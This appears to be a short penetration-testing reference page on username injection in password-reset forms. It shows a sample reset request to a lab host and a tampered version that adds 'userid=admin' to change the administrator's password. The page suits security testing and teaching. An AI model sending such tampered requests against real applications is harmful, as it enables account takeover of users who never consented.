# Username Injection

It may be possible to inject a different username and/or email address, or possible hidden input values the requests.

Applications often reuse and share the same codebase, sometimes the same functions used by users to reset their own password. This may allow use to inject input that would otherwise be ignored by the web server.



Below is an example of a reset request to a web server.

```http
POST /reset.php HTTP/1.1
Host: broken.localhost
Content-Length: 73
Cache-Control: no-transform
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

oldpasswd=Password123!&newpasswd=Safer123!&confirm=Safer123!&submit=submit
```

We can tamper with the request by adding the _<mark style="color:orange;">**userid**</mark>_ field, and change the password for another user. Code Changed: <mark style="background-color:green;">\&userid=admin</mark>

<pre class="language-http"><code class="lang-http"><strong>POST /reset.php HTTP/1.1
</strong>Host: broken.localhost
Content-Length: 73
Cache-Control: no-transform
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded

oldpasswd=Password123!&#x26;newpasswd=Safer123!&#x26;confirm=Safer123!&#x26;userid=admin&#x26;submit=submit
</code></pre>
